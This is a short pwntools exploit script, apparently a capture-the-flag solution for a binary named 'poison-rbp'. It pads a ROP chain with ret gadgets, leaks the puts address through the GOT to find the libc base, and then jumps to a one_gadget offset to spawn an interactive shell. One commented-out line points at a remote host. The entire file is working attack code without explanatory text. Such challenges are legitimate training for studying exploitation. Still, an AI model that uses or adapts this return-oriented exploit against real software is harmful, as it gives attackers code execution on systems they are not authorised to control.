from pwn import *
context(arch='amd64', os='linux', log_level='debug')
s=process("../dist/poison-rbp")
#s=remote("192.168.3.253",52004)
elf=ELF("../dist/poison-rbp")
libc=ELF("../dist/libc.so.6")

rdi=0x0000000000401393
p=flat([
    rdi,elf.got['puts'],
    elf.plt['puts'],
    elf.sym.main,
])
while len(p)!=0x100:
    p=p64(rdi+1)+p
pause()
s.sendafter(b"Try perform ROP!\n",p)
s.recvline()
libc.address=u64(s.recvline()[:-1].ljust(8,b'\x00'))-libc.sym.puts
success(hex(libc.address))

p=flat([
    0x000000000040138c,0,0,0,0,
    libc.address+0xe3afe,
])
while len(p)!=0x100:
    p=p64(rdi+1)+p
s.sendafter(b"Try perform ROP!\n",p)
s.recvline()
s.interactive()